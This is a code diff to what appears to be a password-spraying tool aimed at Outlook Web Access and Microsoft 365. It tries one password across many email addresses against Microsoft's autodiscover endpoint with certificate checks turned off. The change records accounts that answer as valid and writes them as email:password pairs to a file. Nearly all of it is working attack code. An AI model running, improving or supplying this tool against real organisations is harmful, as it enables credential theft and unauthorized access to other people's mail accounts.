@@ -43,8 +43,8 @@ class OWA:
 
     def shutdown(self):
         with open('owa_valid_accounts.txt', 'a+') as account_file:
-            for email in self.valid_accounts:
-                account_file.write(email + '\n')
+            for creds in self.valid_accounts:
+                account_file.write(creds + '\n')
 
         self.log.info(print_good(f"Dumped {len(self.valid_accounts)} valid accounts to owa_valid_accounts.txt"))
 
@@ -78,14 +78,18 @@ class OWA:
 
         headers = {"Content-Type": "text/xml"}
         r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(email, self.password), headers=headers, verify=False)
+        creds = f"{email}:{self.password}"
         if r.status_code == 200:
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            self.valid_accounts.add(creds)
+            log.info(print_good(f"Found credentials: {creds}"))
         elif r.status_code == 457:
-            log.info(print_good(f"Found credentials: {email}:{self.password}"))
+            self.valid_accounts.add(creds)
+            log.info(print_good(f"Found credentials: {creds}"))
         elif r.status_code == 401:
-            log.info(print_bad(f"Authentication failed: {email}:{self.password} (Invalid credentials)"))
+            log.info(print_bad(f"Authentication failed: {creds} (Invalid credentials)"))
         else:
-            log.info(print_good(f"Unexpected status code: {email}:{self.password} (unknown)"))
+            self.valid_accounts.add(creds)
+            log.info(print_good(f"Unexpected status code: {creds} (unknown)"))
 
     def auth(self, email):
         log = logging.getLogger(f"auth_owa({email})")
